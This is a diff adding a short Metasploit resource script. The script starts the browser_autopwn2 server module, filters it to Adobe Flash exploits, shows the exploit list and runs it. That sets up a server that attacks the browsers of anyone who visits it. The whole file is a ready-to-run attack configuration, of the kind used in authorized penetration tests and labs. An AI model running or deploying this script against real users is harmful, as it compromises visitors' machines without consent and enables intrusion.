@@ -1,0 +1,8 @@
+<ruby>
+print_status("Starting Browser Autopwn with Adobe Flash-only BrowserExploitServer-based exploits.")
+print_status("Older Adobe Flash exploits don't use BES, therefore will not be loaded.")
+run_single("use auxiliary/server/browser_autopwn2")
+run_single("set INCLUDE_PATTERN adobe_flash")
+run_single("set ShowExploitList true")
+run_single("run")
+</ruby>
